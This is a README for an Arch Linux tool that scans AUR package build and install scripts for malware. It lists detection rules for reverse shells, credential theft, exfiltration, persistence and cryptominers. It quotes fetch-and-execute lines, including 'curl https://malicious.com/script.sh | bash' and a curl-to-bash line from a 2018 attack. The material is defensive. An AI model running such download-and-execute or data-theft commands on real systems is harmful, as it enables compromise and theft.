# AUR Security Scanner

```
║ ║╔═╝  ╔═║║ ║╔═║  ╔═╝╔═╝╔═║╔═ ╔═ ╔═╝╔═║
╔╝ ══║═╝╔═║║ ║╔╔╝═╝══║║  ╔═║║ ║║ ║╔═╝╔╔╝
╝ ╝══╝  ╝ ╝══╝╝ ╝  ══╝══╝╝ ╝╝ ╝╝ ╝══╝╝ ╝
```

**Detect malicious AUR packages before they compromise your system.**

A comprehensive security scanner for Arch Linux AUR packages that analyzes PKGBUILDs and install scripts for malicious patterns, suspicious behavior, and security vulnerabilities. Written in Rust for performance and safety.

---

## TL;DR

```bash
# Install
paru -S aur-scanner-git
# or
yay -S aur-scanner-git

# Scan a package before installing
aur-scan check <package-name>

# Scan a local PKGBUILD
aur-scan scan ./PKGBUILD

# Scan all installed AUR packages
aur-scan system
```

---

## Table of Contents

- [Why This Exists](#why-this-exists)
- [Features](#features)
- [Installation](#installation)
  - [From AUR](#from-aur)
  - [From Source](#from-source)
  - [Manual Installation](#manual-installation)
- [Quick Start](#quick-start)
- [Command Reference](#command-reference)
  - [aur-scan check](#aur-scan-check)
  - [aur-scan scan](#aur-scan-scan)
  - [aur-scan system](#aur-scan-system)
  - [aur-scan codes](#aur-scan-codes)
  - [aur-scan explain](#aur-scan-explain)
- [Integration Options](#integration-options)
  - [Level 1: Manual CLI](#level-1-manual-cli)
  - [Level 2: Shell Integration](#level-2-shell-integration-recommended)
  - [Level 3: Wrapper Binary](#level-3-wrapper-binary)
  - [Level 4: Pacman Hook](#level-4-pacman-hook)
- [Detection Rules Reference](#detection-rules-reference)
  - [Critical Severity](#critical-severity)
  - [High Severity](#high-severity)
  - [Medium Severity](#medium-severity)
  - [Low/Informational](#lowinformational)
- [Output Formats](#output-formats)
- [Configuration](#configuration)
- [Real-World Detection Examples](#real-world-detection-examples)
- [Project Architecture](#project-architecture)
- [Dependencies](#dependencies)
- [Building from Source](#building-from-source)
- [Testing](#testing)
- [License](#license)
- [Contributing](#contributing)
- [Security](#security)
- [Credits](#credits)
- [Disclaimer](#disclaimer)

---

## Why This Exists

The Arch User Repository (AUR) is an incredible community resource that extends Arch Linux with thousands of user-contributed packages. However, AUR packages are inherently untrusted and have been exploited multiple times:

| Date | Attack | Impact |
|------|--------|--------|
| **July 2025** | CHAOS RAT distributed via `firefox-patch-bin` and `librewolf-fix-bin` | Remote access trojan with persistence via systemd masquerading |
| **2018** | Orphaned packages `acroread`, `balz`, `minergate` hijacked | Cryptominer installation via `curl \| bash` and systemd timers |
| **Ongoing** | Typosquatting attacks mimicking popular package names | Various malware payloads |

**There was no automated tool to scan for these threats before installation. Now there is.**

This scanner implements detection rules based on real-world attacks and security research, providing an additional layer of defense for the Arch Linux ecosystem.

---

## Features

| Feature | Description |
|---------|-------------|
| **Static Analysis** | Pattern-based detection of 50+ malicious code patterns |
| **Install Script Scanning** | Analyzes `.install` scripts for persistence mechanisms |
| **Source Verification** | Validates URLs, checksums, and download sources |
| **AUR Integration** | Fetch and scan packages directly from AUR before installation |
| **System Audit** | Scan all installed AUR packages in a single command |
| **Multiple Output Formats** | Human-readable, JSON, and SARIF for CI/CD integration |
| **Shell Integration** | Seamless wrapper for yay, paru, and other AUR helpers |
| **Pacman Hook** | System-wide enforcement during package transactions |
| **Offline Operation** | Core scanning works without network access |
| **Zero Dependencies Runtime** | Single static binary with no runtime dependencies |

---

## Installation

### From AUR

```bash
# Using paru
paru -S ks-aur-scanner

# Using yay
yay -S ks-aur-scanner
```

### From Source

```bash
git clone https://github.com/KiefStudioMA/ks-aur-scanner.git
cd ks-aur-scanner
cargo build --release
```

### Manual Installation

After building from source:

```bash
# Install binaries
sudo install -Dm755 target/release/aur-scan /usr/bin/aur-scan
sudo install -Dm755 target/release/aur-scan-wrap /usr/bin/aur-scan-wrap
sudo install -Dm755 target/release/aur-scan-hook /usr/bin/aur-scan-hook

# Install shell integration (optional)
sudo install -Dm644 install/integration.bash /usr/share/aur-scan/integration.bash
sudo install -Dm644 install/integration.zsh /usr/share/aur-scan/integration.zsh

# Install pacman hook (optional)
sudo install -Dm644 install/aur-scan.hook /usr/share/libalpm/hooks/aur-scan.hook
```

---

## Quick Start

```bash
# Check a package BEFORE installing from AUR
aur-scan check firefox-patch-bin

# Scan a local PKGBUILD file
aur-scan scan ./PKGBUILD

# Scan an entire package directory
aur-scan scan ./my-package/

# Audit all installed AUR packages on your system
aur-scan system

# Learn about a specific detection code
aur-scan explain DLE-001

# List all detection codes
aur-scan codes
```

---

## Command Reference

### aur-scan check

Fetch and scan a package from the AUR without installing it.

```bash
aur-scan check <package-name> [OPTIONS]

OPTIONS:
    --format <FORMAT>    Output format: text, json, sarif [default: text]
    --fail-on <LEVEL>    Exit with error if findings at this level or above
                         Values: critical, high, medium, low, info
    --no-color           Disable colored output
```

**Examples:**

```bash
# Basic check
aur-scan check librewolf-bin

# Check with JSON output for scripting
aur-scan check librewolf-bin --format json

# Fail CI/CD pipeline on high severity findings
aur-scan check my-package --fail-on high
```

### aur-scan scan

Scan a local PKGBUILD file or directory.

```bash
aur-scan scan <PATH> [OPTIONS]

OPTIONS:
    --format <FORMAT>    Output format: text, json, sarif [default: text]
    --fail-on <LEVEL>    Exit with error if findings at this level or above
    --no-color           Disable colored output

ARGUMENTS:
    <PATH>               Path to PKGBUILD file or directory containing PKGBUILD
```

**Examples:**

```bash
# Scan a single PKGBUILD
aur-scan scan ./PKGBUILD

# Scan a package directory (looks for PKGBUILD and .install files)
aur-scan scan ~/builds/my-package/

# Output SARIF for GitHub Security tab integration
aur-scan scan ./PKGBUILD --format sarif > results.sarif
```

### aur-scan system

Audit all AUR packages currently installed on the system.

```bash
aur-scan system [OPTIONS]

OPTIONS:
    --format <FORMAT>    Output format: text, json [default: text]
    --no-color           Disable colored output
```

This command:
1. Queries pacman for foreign (non-repo) packages
2. Locates cached PKGBUILDs in AUR helper cache directories
3. Scans each package and reports findings

**Supported cache locations:**
- `~/.cache/paru/clone/`
- `~/.cache/yay/`
- `~/.cache/pikaur/aur_repos/`
- `~/.cache/trizen/`

### aur-scan codes

List all detection codes with their severity and description.

```bash
aur-scan codes [OPTIONS]

OPTIONS:
    --severity <LEVEL>   Filter by severity level
    --category <CAT>     Filter by category
```

**Example output:**

```
CRITICAL SEVERITY
-----------------
DLE-001    Curl pipe to shell
DLE-002    Wget pipe to shell
DLE-003    Curl output executed
SHELL-001  Bash reverse shell
SHELL-002  Netcat reverse shell
...
```

### aur-scan explain

Get detailed information about a specific detection code.

```bash
aur-scan explain <CODE>
```

**Example:**

```bash
$ aur-scan explain DLE-001

DLE-001: Curl pipe to shell
===========================

Severity: CRITICAL
Category: Command Injection
CWE: CWE-94

Description:
  Downloading and executing remote scripts is extremely dangerous.
  Used in 2018 xeactor attack.

Recommendation:
  Download scripts first, review them, then execute

Example Pattern:
  curl https://malicious.com/script.sh | bash
```

---

## Integration Options

### Level 1: Manual CLI

Use `aur-scan` commands directly before installing packages. This provides full control but requires manual invocation.

```bash
# Check package first
aur-scan check some-package

# Review output, then install if safe
paru -S some-package
```

### Level 2: Shell Integration (Recommended)

Add automatic scanning to your shell by sourcing the integration script.

**For Bash** - Add to `~/.bashrc`:

```bash
source /usr/share/aur-scan/integration.bash
```

**For Zsh** - Add to `~/.zshrc`:

```bash
source /usr/share/aur-scan/integration.zsh
```

This creates wrapper functions for `paru` and `yay` that:
1. Detect AUR package installations
2. Pre-scan packages before proceeding
3. Prompt for confirmation on findings
4. Provide `paru-unsafe` and `yay-unsafe` aliases to bypass scanning

**Example workflow:**

```bash
$ paru -S some-aur-package
AUR Security Scanner: Pre-checking packages...
============================================================
Checking: some-aur-package... OK
============================================================
Proceeding with installation...
```

### Level 3: Wrapper Binary

Use the standalone wrapper binary for explicit control:

```bash
# Direct usage
aur-scan-wrap paru -S package-name

# Or set up as an alias
alias paru='aur-scan-wrap paru'
alias yay='aur-scan-wrap yay'
```

The wrapper:
- Detects sync operations (`-S`, `--sync`)
- Filters to only AUR packages (skips official repo packages)
- Scans each AUR package before proceeding
- Prompts on critical/high findings
- Passes through non-install operations unchanged

### Level 4: Pacman Hook

For system-wide enforcement, install the pacman hook:

```bash
sudo cp /usr/share/aur-scan/aur-scan.hook /usr/share/libalpm/hooks/
```

**Hook behavior:**
- Triggers before package transactions
- Scans packages being installed
- **Aborts transaction on CRITICAL findings**
- Warns on HIGH severity findings
- Requires explicit override for critical issues

**Hook configuration** (`/usr/share/libalpm/hooks/aur-scan.hook`):

```ini
[Trigger]
Operation = Install
Operation = Upgrade
Type = Package
Target = *

[Action]
Description = Scanning AUR packages for security issues...
When = PreTransaction
Exec = /usr/bin/aur-scan-hook
AbortOnFail
NeedsTargets
```

---

## Detection Rules Reference

### Critical Severity

These patterns indicate likely malicious behavior and should always be investigated.

| Code | Name | Description | CWE |
|------|------|-------------|-----|
| `DLE-001` | Curl pipe to shell | `curl ... \| bash` pattern | CWE-94 |
| `DLE-002` | Wget pipe to shell | `wget ... \| sh` pattern | CWE-94 |
| `DLE-003` | Curl output executed | Download and execute via file | CWE-94 |
| `PASTE-001` | Pastebin download | Downloads from paste sites (pastebin, ptpb.pw, etc.) | CWE-506 |
| `SHELL-001` | Bash reverse shell | `/dev/tcp/` connections | CWE-506 |
| `SHELL-002` | Netcat reverse shell | `nc -e` or `ncat -e` patterns | CWE-506 |
| `SHELL-003` | Python reverse shell | Python socket connections | CWE-506 |
| `SHELL-004` | Socat shell | Socat TCP/EXEC patterns | CWE-506 |
| `CRED-001` | SSH key access | Access to `~/.ssh/` | CWE-522 |
| `CRED-002` | GPG key access | Access to `~/.gnupg/` | CWE-522 |
| `CRED-003` | Password file access | Access to shadow, netrc, AWS credentials | CWE-522 |
| `BROWSER-001` | Browser profile access | Access to Firefox/Chrome profiles | CWE-522 |
| `BROWSER-002` | Browser database access | Access to logins.json, cookies.sqlite | CWE-522 |
| `PRIV-001` | Sudo in build | Using sudo in build/package functions | CWE-250 |
| `PRIV-002` | SUID/SGID setting | Setting setuid/setgid bits | CWE-250 |
| `PRIV-003` | Sudoers modification | Modifying /etc/sudoers | CWE-250 |
| `INSTALL-001` | Python in install script | Executing Python in post_install | CWE-94 |
| `INSTALL-003` | Network in install script | curl/wget in install scripts | CWE-494 |
| `PERSIST-001` | Systemd service creation | Creating/enabling systemd services | CWE-506 |
| `PERSIST-002` | Systemd timer creation | Creating systemd timers | CWE-506 |
| `PERSIST-004` | rc.local modification | Modifying boot scripts | CWE-506 |
| `PERSIST-006` | Systemd masquerading | Binary named like systemd component | CWE-506 |
| `CRYPTO-001` | Mining pool connection | stratum+tcp:// or pool URLs | CWE-506 |
| `CRYPTO-002` | Cryptominer binary | Known miner executables (xmrig, etc.) | CWE-506 |
| `CRYPTO-003` | Wallet address | Cryptocurrency wallet addresses | CWE-506 |
| `EXFIL-001` | Curl POST exfiltration | Sending data via curl POST | CWE-200 |
| `EXFIL-002` | Netcat data transfer | Piping data through netcat | CWE-200 |
| `EXFIL-003` | Discord/Telegram webhook | Webhook URLs for C2/exfil | CWE-506 |
| `ENV-001` | LD_PRELOAD manipulation | Library injection via LD_PRELOAD | CWE-426 |
| `ENV-003` | Shell config modification | Modifying bashrc/zshrc/profile | CWE-506 |

### High Severity

Suspicious patterns that warrant careful review.

| Code | Name | Description | CWE |
|------|------|-------------|-----|
| `OBF-001` | Base64 decoding | `base64 -d` may hide payloads | CWE-506 |
| `OBF-002` | Eval usage | Dynamic code execution | CWE-95 |
| `OBF-003` | Hex-encoded payload | `\xNN` escape sequences | CWE-506 |
| `OBF-005` | Gzip decode execution | Decompress and execute | CWE-94 |
| `CHK-001` | No checksums | Sources without any checksums | CWE-354 |
| `CHK-005` | All sources SKIP | All non-VCS sources use SKIP checksum | CWE-354 |
| `CHK-006` | Checksum mismatch | Checksum count doesn't match source count | - |
| `URL-001` | Raw IP in URL | URLs with IP addresses instead of domains | - |
| `URL-002` | URL shortener | bit.ly, tinyurl, etc. | - |
| `URL-003` | Dynamic DNS domain | duckdns, no-ip, etc. | - |
| `INSTALL-002` | Binary execution in install | Running binaries during install | CWE-94 |
| `PERSIST-003` | Cron job creation | Creating cron entries | - |
| `PERSIST-005` | XDG autostart creation | Creating autostart entries | - |
| `HIDDEN-001` | Hidden file in home | Creating ~/. files | - |
| `HIDDEN-002` | Tmp directory execution | Running code from /tmp | - |
| `HIDDEN-003` | Non-standard binary location | Binaries in share directories | - |
| `ENV-002` | PATH manipulation | Overwriting PATH variable | CWE-426 |

### Medium Severity

Security concerns that should be reviewed but may be legitimate.

| Code | Name | Description | CWE |
|------|------|-------------|-----|
| `CHK-002` | MD5 checksum | Using broken MD5 algorithm | CWE-328 |
| `CHK-003` | SHA1 checksum | Using weak SHA1 algorithm | CWE-328 |
| `CHK-004` | Partial SKIP checksums | Some non-VCS sources use SKIP | CWE-354 |
| `NET-001` | HTTP source URL | Downloading sources over HTTP | CWE-319 |
| `SRC-001` | Suspicious git source | Git from non-standard hosting | - |
| `OBF-004` | String concatenation | Obfuscating commands via concatenation | - |

> **Note:** VCS sources (git, svn, hg, bzr) legitimately use `SKIP` checksums since their content changes with each clone. The scanner only flags `SKIP` checksums on non-VCS sources (tarballs, patches, etc.).

### Low/Informational

Observations that may be relevant for comprehensive review.

| Code | Name | Description |
|------|------|-------------|
| `META-001` | Provides impersonation | Package provides another package name |

---

## Output Formats

### Text (Default)

Human-readable output with colored severity indicators:

```bash
aur-scan scan ./PKGBUILD
```

### JSON

Machine-readable JSON for scripting and automation:

```bash
aur-scan scan ./PKGBUILD --format json
```

**Example output:**

```json
{
  "package_name": "example-package",
  "package_version": "1.0.0-1",
  "scan_duration_ms": 45,
  "findings": [
    {
      "id": "DLE-001",
      "severity": "critical",
      "category": "command_injection",
      "title": "Curl pipe to shell",
      "description": "Downloading and executing remote scripts is extremely dangerous.",
      "location": {
        "file": "PKGBUILD",
        "line": 23,
        "column": 5,
        "snippet": "curl https://example.com/install.sh | bash"
      },
      "recommendation": "Download scripts first, review them, then execute",
      "cwe_id": "CWE-94"
    }
  ]
}
```

### SARIF

Static Analysis Results Interchange Format for CI/CD integration:

```bash
aur-scan scan ./PKGBUILD --format sarif > results.sarif
```

SARIF output is compatible with:
- GitHub Code Scanning
- Azure DevOps
- Visual Studio
- Other SARIF-compatible tools

---

## Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `AUR_SCAN_ENABLED` | `1` | Enable/disable scanning in shell integration |
| `AUR_SCAN_SEVERITY` | `high` | Minimum severity to display |
| `AUR_SCAN_INTERACTIVE` | `1` | Prompt before proceeding |
| `AUR_SCAN_COLOR` | `1` | Enable colored output |

### Configuration File

Optional configuration file at `/etc/aur-scanner/config.toml`:

```toml
# Minimum severity to report
min_severity = "low"

# Scan timeout in seconds
timeout_seconds = 30

# Cache settings
[cache]
enabled = true
directory = "/var/cache/aur-scanner"
max_size_mb = 100
ttl_hours = 24
```

---

## Real-World Detection Examples

### CHAOS RAT Attack (July 2025)

The scanner would have detected this attack with the following findings:

```
[CRITICAL] PERSIST-006 Systemd masquerading
    Location: PKGBUILD:45
    Binary named like systemd component: 'systemd-initd'

[CRITICAL] INSTALL-001 Python execution in install script
    Location: librewolf-fix-bin.install:12
    Executing Python in post_install is suspicious

[CRITICAL] PERSIST-001 Systemd service creation
    Location: librewolf-fix-bin.install:15
    systemctl enable firefox-fix.service

[HIGH] HIDDEN-002 Tmp directory execution
    Location: PKGBUILD:23
    /tmp/systemd-initd
```

### 2018 Cryptominer Attack (xeactor)

```
[CRITICAL] DLE-001 Curl pipe to shell
    Location: PKGBUILD:18
    curl -s https://ptpb.pw/~x | bash

[CRITICAL] PASTE-001 Pastebin download
    Location: PKGBUILD:18
    Downloads from paste sites (ptpb.pw)

[CRITICAL] PERSIST-002 Systemd timer creation
    Location: PKGBUILD:34
    OnBootSec=1min

[CRITICAL] CRYPTO-001 Mining pool connection
    Location: hidden-script.sh:5
    stratum+tcp://pool.supportxmr.com:3333
```

---

## Project Architecture

```
ks-aur-scanner/
├── Cargo.toml                    # Workspace manifest
├── crates/
│   ├── aur-scanner-core/         # Core analysis engine (library)
│   │   ├── src/
│   │   │   ├── lib.rs            # Public API
│   │   │   ├── types.rs          # Core types (Severity, Finding, etc.)
│   │   │   ├── error.rs          # Error types
│   │   │   ├── parser/           # PKGBUILD parsing
│   │   │   ├── rules/            # Rule engine and built-in rules
│   │   │   ├── analyzer/         # Security analyzers
│   │   │   ├── aur.rs            # AUR RPC client
│   │   │   └── cache/            # Result caching
│   │   └── Cargo.toml
│   ├── aur-scanner-cli/          # CLI binary (aur-scan)
│   │   ├── src/
│   │   │   ├── main.rs           # Entry point
│   │   │   └── commands/         # Subcommands
│   │   └── Cargo.toml
│   ├── aur-scanner-hook/         # Pacman hook binary
│   │   ├── src/main.rs
│   │   └── Cargo.toml
│   └── aur-scanner-plugin/       # AUR helper wrapper
│       ├── src/
│       │   ├── lib.rs            # Plugin library
│       │   └── bin/wrapper.rs    # Wrapper binary
│       └── Cargo.toml
├── install/                      # Installation files
│   ├── integration.bash
│   ├── integration.zsh
│   └── aur-scan.hook
├── tests/                        # Integration tests
└── PKGBUILD                      # AUR package definition
```

---

## Dependencies

### Build Dependencies

| Crate | Version | Purpose |
|-------|---------|---------|
| `tokio` | 1.40 | Async runtime |
| `async-trait` | 0.1 | Async trait support |
| `futures` | 0.3 | Future combinators |
| `regex` | 1.11 | Pattern matching |
| `lazy_static` | 1.5 | Compile-time regex |
| `serde` | 1.0 | Serialization |
| `serde_json` | 1.0 | JSON support |
| `toml` | 0.8 | Configuration parsing |
| `thiserror` | 1.0 | Error handling |
| `anyhow` | 1.0 | Error context |
| `tracing` | 0.1 | Logging |
| `tracing-subscriber` | 0.3 | Log formatting |
| `clap` | 4.5 | CLI argument parsing |
| `reqwest` | 0.12 | HTTP client (rustls) |
| `chrono` | 0.4 | Date/time handling |
| `colored` | 2.1 | Terminal colors |
| `blake3` | 1.5 | Fast hashing |
| `sha2` | 0.10 | SHA-256 checksums |
| `base64` | 0.22 | Base64 encoding |

### Runtime Dependencies

None. The release binary is statically linked.

### System Requirements

- Arch Linux (or Arch-based distribution)
- Rust 1.70+ (for building)
- `pacman` (for system audit feature)

---

## Building from Source

### Prerequisites

```bash
# Install Rust via rustup
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Ensure cargo is in PATH
source ~/.cargo/env
```

### Build

```bash
# Clone repository
git clone https://github.com/KiefStudioMA/ks-aur-scanner.git
cd ks-aur-scanner

# Build release version (optimized)
cargo build --release

# Binaries are in target/release/
ls -la target/release/aur-scan*
```

### Build Options

```bash
# Debug build (faster compilation, slower runtime)
cargo build

# Release build with full optimizations
cargo build --release

# Check for errors without building
cargo check

# Build with all warnings as errors
RUSTFLAGS="-D warnings" cargo build
```

---

## Testing

```bash
# Run all tests
cargo test

# Run tests with output
cargo test -- --nocapture

# Run specific test
cargo test test_detect_curl_bash

# Run clippy lints
cargo clippy

# Check formatting
cargo fmt --check
```

### Test Coverage

The test suite includes:
- Unit tests for parser, rule matching, and analyzers
- Integration tests with fixture PKGBUILDs
- Malicious pattern detection tests
- False positive prevention tests
- AUR API client tests

---

## License

This software is licensed under the **GNU General Public License v3.0 or later** (GPL-3.0-or-later).

You are free to use, modify, and distribute this software under the terms of the GPL-3.0. See the [LICENSE](LICENSE) file for the complete license text.

### Commercial Use and Attribution

Commercial use is permitted under the GPL-3.0 license. However, commercial users are kindly requested to:

- Provide attribution to **Kief Studio** with a do-follow link to [https://kief.studio](https://kief.studio)
- Consider supporting continued development of this project

This attribution request is not a legal requirement but is appreciated and helps sustain open source security tooling for the Arch community.

### Commercial Support

For commercial support, custom development, or enterprise licensing inquiries:

- **Website:** [https://kief.studio](https://kief.studio)
- **Email:** packages@kief.studio

---

## Contributing

Contributions are welcome under the terms of the project license.

### Areas for Contribution

- **Detection Rules:** New patterns for emerging threats
- **False Positive Fixes:** Improve pattern accuracy
- **Documentation:** Improve guides and examples
- **Testing:** Additional test cases and fixtures
- **Integration:** Support for additional AUR helpers

### Contribution Process

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Run tests: `cargo test`
5. Run lints: `cargo clippy`
6. Submit a pull request

### Code Standards

- All code must pass `cargo clippy` with no warnings
- All code must be formatted with `cargo fmt`
- All public APIs must be documented
- New features must include tests

---

## Security

### Reporting Vulnerabilities

If you discover a security vulnerability in this project, please report it responsibly:

- **Email:** security@kief.studio
- **Do not** open public issues for security vulnerabilities

### Security Considerations

- This tool performs static analysis only; it cannot detect all threats
- Dynamic analysis (sandboxing) is beyond the current scope
- Always review PKGBUILDs manually for critical systems
- The AUR is inherently a trust-based system

---

## Credits

**Developed by [Kief Studio](https://kief.studio)**

This project was created to address a critical gap in the Arch Linux security ecosystem. Special thanks to the security researchers who documented the attacks that informed our detection rules.

### References

- Arch Linux Security Advisory regarding 2018 AUR malware
- CHAOS RAT analysis (July 2025)
- CWE (Common Weakness Enumeration) database
- OWASP guidelines for code injection prevention

---

## Disclaimer

This tool provides an additional layer of security but **does not guarantee complete protection**.

- Static analysis cannot detect all forms of malicious behavior
- Obfuscated or novel attack patterns may evade detection
- False positives may occur; always verify findings
- This tool supplements but does not replace manual PKGBUILD review

The AUR is an inherently trust-based system where users are expected to verify package contents before installation. This scanner is a defense-in-depth measure, not a security guarantee.

**Use at your own risk. The authors are not responsible for any damage caused by malicious packages, whether detected or not.**

---

## Links

- **AUR Package:** [aur-scanner-git](https://aur.archlinux.org/packages/aur-scanner-git)
- **Repository:** [https://github.com/KiefStudioMA/ks-aur-scanner](https://github.com/KiefStudioMA/ks-aur-scanner)
- **Crates.io:** [aur-scanner-core](https://crates.io/crates/aur-scanner-core)
- **Homepage:** [https://kief.studio](https://kief.studio)
- **Issues:** [https://github.com/KiefStudioMA/ks-aur-scanner/issues](https://github.com/KiefStudioMA/ks-aur-scanner/issues)
- **License:** [GPL-3.0-or-later](LICENSE)
